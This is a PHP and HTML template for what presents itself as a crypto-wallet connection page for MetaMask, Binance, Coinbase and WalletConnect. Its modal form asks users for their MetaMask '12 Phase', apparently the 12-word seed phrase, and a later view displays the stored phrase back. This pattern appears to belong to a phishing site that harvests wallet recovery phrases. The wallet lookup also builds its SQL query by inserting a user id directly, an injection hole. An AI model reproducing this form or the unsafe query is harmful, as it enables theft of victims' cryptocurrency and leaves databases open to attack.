<?php

$sql = "SELECT * FROM wallet WHERE wallet_owner_id = $user_id";
$result = $conn->query($sql);
$row = $result->fetch_assoc();
$wallet_id = $row['wallet_id'];

if ($wallet_status == 0) {
    $wallet_status_rp = 'not connected';
} elseif ($wallet_status == 1) {
    $wallet_status_rp = 'connected';
} elseif ($wallet_status == 2) {
    $wallet_status_rp = 'pending approval';
}

// Map numeric values to corresponding names
switch ($wallet_key) {
    case 1:
        $wallet_key_name = 'metamask';
        break;
    case 2:
        $wallet_key_name = 'binance';
        break;
    case 3:
        $wallet_key_name = 'coinbase';
        break;
    case 4:
        $wallet_key_name = 'WalletConnect';
        break;
}

?>
<?php if ($wallet_status == 0) { ?>
    <div class="modal fade" id="metaMask">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">

                <!-- Modal Header -->
                <div class="modal-header">
                    <h4 class="modal-title">Meta Mask</h4>
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                </div>

                <!-- Modal Body -->
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group">
                            <label for="input">Meta Mask 12 Phase</label>
                            <input type="text" class="form-control" name="wallet_phase"
                                   placeholder="Enter Wallet Phase">
                        </div>
                        <div class="form-group">
                            <label for="input2">Meta Mask Username</label>
                            <input type="text" class="form-control" name="wallet_username"
                                   placeholder="Metamask UserName">
                        </div>
                        <button type="submit" class="btn btn-primary" name="meta_mask">Submit</button>
                    </form>
                </div>

                <!-- Modal Footer -->
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                </div>

            </div>
        </div>
    </div>
<?php } elseif ($wallet_status == 1) { ?>
    <!-- The Modal -->
    <div class="modal fade" id="modal<?= $wallet_key ?>">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">

                <!-- Modal Header -->
                <div class="modal-header">
                    <h4 class="modal-title"><?= $wallet_name . ' ' ?><span
                            class="p-2 text-success bg-dark"><?= $wallet_status_rp ?></span></h4>
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                </div>

                <!-- Modal Body -->
                <div class="modal-body">
                    <div class="p-3 border-1">Your wallet phase</div>
                    <div class="p-3 border-1"><?= $wallet_phase ?></div>
                </div>

                <!-- Modal Footer -->
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                </div>

            </div>
        </div>
    </div>
<?php } ?>
